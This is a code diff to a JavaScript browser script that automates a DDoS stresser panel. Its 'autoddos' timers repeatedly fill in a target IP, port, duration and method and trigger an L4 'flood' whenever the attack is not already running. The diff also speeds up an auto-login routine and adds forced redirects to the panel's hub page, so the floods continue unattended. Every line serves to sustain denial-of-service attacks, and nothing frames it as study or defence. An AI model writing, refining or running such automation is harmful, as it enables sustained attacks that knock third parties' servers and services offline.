@@ -34,28 +34,32 @@ var waktu2="120";
 var methode2="1"
 
 var autoddos1 = setInterval(function (){
-    if(document.getElementsByClassName("table mb-0")[0].getElementsByTagName("tbody")[0].textContent.includes(iptarget1)||iptarget1 ==""){
-        return
-    }
-    document.getElementById("hostL4").value = iptarget1
-    document.getElementById("portL4").value = porttarget1
-    document.getElementById("timeL4").value = waktu1
-    document.getElementById("methodL4").selectedIndex = methode1
+    if(document.location.href.includes("hub")){
+        if(document.getElementsByClassName("table mb-0")[0].getElementsByTagName("tbody")[0].textContent.includes(iptarget1)||iptarget1 ==""){
+            return
+        }
+        document.getElementById("hostL4").value = iptarget1
+        document.getElementById("portL4").value = porttarget1
+        document.getElementById("timeL4").value = waktu1
+        document.getElementById("methodL4").selectedIndex = methode1
 
         L4btn('flood', '');
+    }
 
 },2000)
 
 var autoddos2 = setInterval(function (){
-    if(document.getElementsByClassName("table mb-0")[0].getElementsByTagName("tbody")[0].textContent.includes(iptarget2)||iptarget2 ==""){
-        return
-    }
-    document.getElementById("hostL4").value = iptarget2
-    document.getElementById("portL4").value = porttarget2
-    document.getElementById("timeL4").value = waktu2
-    document.getElementById("methodL4").selectedIndex = methode2
+    if(document.location.href.includes("hub")){
+        if(document.getElementsByClassName("table mb-0")[0].getElementsByTagName("tbody")[0].textContent.includes(iptarget2)||iptarget2 ==""){
+            return
+        }
+        document.getElementById("hostL4").value = iptarget2
+        document.getElementById("portL4").value = porttarget2
+        document.getElementById("timeL4").value = waktu2
+        document.getElementById("methodL4").selectedIndex = methode2
 
         L4btn('flood', '');
+    }
 
 },2000)
 
@@ -63,7 +67,7 @@ var autoddos2 = setInterval(function (){
 
 var autologin = setInterval(function (){
     if(document.querySelectorAll("[href='login']")[0]){
-       document.querySelectorAll("[href='login']")[0].click()
+        document.querySelectorAll("[href='login']")[0].click()
     }
     if(document.location.href.includes("login")){
         document.getElementById("username").value = username
@@ -72,9 +76,18 @@ var autologin = setInterval(function (){
     }
 
 
-},5000)
+},1000)
+
+var autohub = setInterval(function (){
+    if(document.location.href.includes("index")||document.location.href.includes("login")){
+        return;
+    }
+    if(!document.location.href.includes("hub")){
+        document.location.href=document.location.origin + "/hub"
+    }
+}, 2000);
 
 
 window.setTimeout( function() {
-  document.location.href=document.location.origin + "/hub"
+    document.location.href=document.location.origin + "/hub"
 }, 10000);
